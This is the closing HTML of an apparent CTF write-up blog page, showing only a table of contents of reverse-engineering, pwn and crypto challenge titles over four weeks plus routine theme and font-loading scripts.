                <div class="widget--toc">
                    <nav id="TableOfContents">
  <ul>
    <li><a href="#week1">Week1</a>
      <ul>
        <li><a href="#reeasyasm">[RE]easyasm</a></li>
        <li><a href="#recreakme">[RE]creakme</a></li>
        <li><a href="#reflag-checker">[RE]Flag Checker</a></li>
        <li><a href="#re猫头鹰是不是猫">[RE]猫头鹰是不是猫</a></li>
        <li><a href="#pwnenter_the_pwn_land">[Pwn]enter_the_pwn_land</a></li>
        <li><a href="#pwnenter_the_evil_pwn_land">[Pwn]enter_the_evil_pwn_land</a></li>
        <li><a href="#pwntest_your_gdb">[Pwn]test_your_gdb</a></li>
      </ul>
    </li>
    <li><a href="#week2">Week2</a>
      <ul>
        <li><a href="#rexd-maze">[RE]xD MAZE</a></li>
        <li><a href="#reupx-magic-0">[RE]upx magic 0</a></li>
        <li><a href="#reupx-magic-1">[RE]upx magic 1</a></li>
        <li><a href="#refake-shell">[RE]fake shell</a></li>
        <li><a href="#recreakme2">[RE]creakme2</a></li>
        <li><a href="#cryptothe-password-plus-pro-max-ultra">[Crypto]The Password Plus Pro Max Ultra</a></li>
      </ul>
    </li>
    <li><a href="#week3">Week3</a>
      <ul>
        <li><a href="#reanswers-windows">[RE]Answer&rsquo;s windows</a></li>
        <li><a href="#recreakme_3">[RE]creakme_3</a></li>
        <li><a href="#refishman">[RE]fishman</a></li>
      </ul>
    </li>
    <li><a href="#week4">week4</a>
      <ul>
        <li><a href="#rehardasm">[RE]hardasm</a></li>
        <li><a href="#reezvm">[RE]ezvm</a></li>
        <li><a href="#reserver">[RE]server</a></li>
        <li><a href="#rewow">[RE]WOW</a></li>
      </ul>
    </li>
  </ul>
</nav>
                </div>
            </section>
        </aside>
    

        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
                defer="false"
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
